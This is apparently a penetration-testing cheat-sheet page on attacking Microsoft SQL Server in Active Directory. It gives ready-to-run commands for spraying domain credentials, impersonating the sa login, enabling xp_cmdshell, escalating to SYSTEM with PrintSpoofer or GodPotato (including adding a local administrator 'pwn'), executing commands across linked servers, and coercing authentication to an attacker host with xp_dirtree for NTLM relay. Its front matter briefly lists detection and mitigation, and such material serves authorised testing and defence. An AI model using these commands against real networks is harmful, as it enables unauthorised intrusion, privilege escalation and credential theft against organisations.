---
title: MSSQL in AD
category: AD / Lateral Movement
order: 30
tags: [mssql, xp_cmdshell, linked-servers, impersonation, seimpersonate, potato, coerce, relay]
summary: >
  SQL Server is everywhere on internal networks and speaks Windows auth. Log in
  with domain creds, escalate inside SQL (impersonation / trustworthy DBs), run
  OS commands with xp_cmdshell, then jump to SYSTEM via SeImpersonate, hop across
  linked servers, or coerce its auth for a relay.
prerequisites:
  - Domain creds that can log into a SQL instance ($ip), or a captured SQL login
  - For OS exec: sysadmin (directly, via impersonation, or a trustworthy DB chain)
tools: [netexec (mssql), impacket (mssqlclient), PowerUpSQL, mssqlpwner, PrintSpoofer, GodPotato]
detection:
  - xp_cmdshell enablement/use; unusual EXECUTE AS; linked-server queries; SQL auth from odd hosts
  - Potato privesc — anomalous named-pipe / OXID-resolver (135) activity from the SQL service account
mitigation:
  - Least-privilege SQL logins; disable xp_cmdshell; avoid TRUSTWORTHY; separate service accounts
  - Run SQL under a gMSA; where feasible remove SeImpersonate from service accounts and patch
refs:
  - { label: "PowerUpSQL", url: "https://github.com/NetSPI/PowerUpSQL" }
  - { label: "HackTricks — MSSQL", url: "https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server" }
---

## Find + log in

```sh
# spray domain creds against SQL, see where you can log in / are admin
netexec mssql $ip -u $user -p $password
netexec mssql $ip/24 -u $user -p $password --local-auth
mssqlclient.py -windows-auth $domain/$user:$password@$ip
```

## Privilege escalation inside SQL

```sql
-- who am I / can I impersonate?
SELECT SYSTEM_USER, IS_SRVROLEMEMBER('sysadmin');
SELECT distinct b.name FROM sys.server_permissions a
  JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id
  WHERE a.permission_name = 'IMPERSONATE';
-- impersonate a sysadmin login
EXECUTE AS LOGIN = 'sa'; SELECT IS_SRVROLEMEMBER('sysadmin');
```

## OS command execution

```sql
EXEC sp_configure 'show advanced options',1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';
```

## SeImpersonate → SYSTEM (service-account privesc)

`xp_cmdshell` runs as the **SQL Server service account**, which almost always
holds **SeImpersonatePrivilege**. That's a straight line to SYSTEM on the host
via a "potato" — abuse the privilege to impersonate a SYSTEM token from a coerced
named‑pipe / RPC authentication.

```sql
-- confirm the privilege (look for SeImpersonatePrivilege = Enabled)
EXEC xp_cmdshell 'whoami /priv';
-- then run a potato from a writable dir -> SYSTEM
EXEC xp_cmdshell 'C:\Windows\Temp\PrintSpoofer.exe -i -c "cmd /c whoami"';
EXEC xp_cmdshell 'C:\Windows\Temp\GodPotato.exe -cmd "cmd /c net localgroup administrators pwn /add"';
```

> Pick the potato by OS: **PrintSpoofer** / **GodPotato** cover Server 2016–2022
> and Win10/11; JuicyPotato is dead on modern builds; **RoguePotato** needs an
> OXID resolver reachable. This is the usual `sysadmin → SYSTEM` bridge — the same
> SeImpersonate trick applies to IIS/other service accounts.

## Linked servers (hop to other instances)

```sql
EXEC sp_linkedservers;                              -- discover
SELECT * FROM OPENQUERY("SQL02", 'SELECT SYSTEM_USER');
EXEC ('sp_configure ''xp_cmdshell'',1; RECONFIGURE; EXEC xp_cmdshell ''whoami''') AT "SQL02";
```

## Coerce SQL auth → relay

```sql
-- make the SQL service account authenticate to you (then relay it — see NTLM relay)
EXEC master..xp_dirtree '\\$attacker_ip\share', 1, 1;
```

> `mssqlpwner` / PowerUpSQL automate the impersonation + linked-server graph —
> handy for chaining several hops to a sysadmin context.
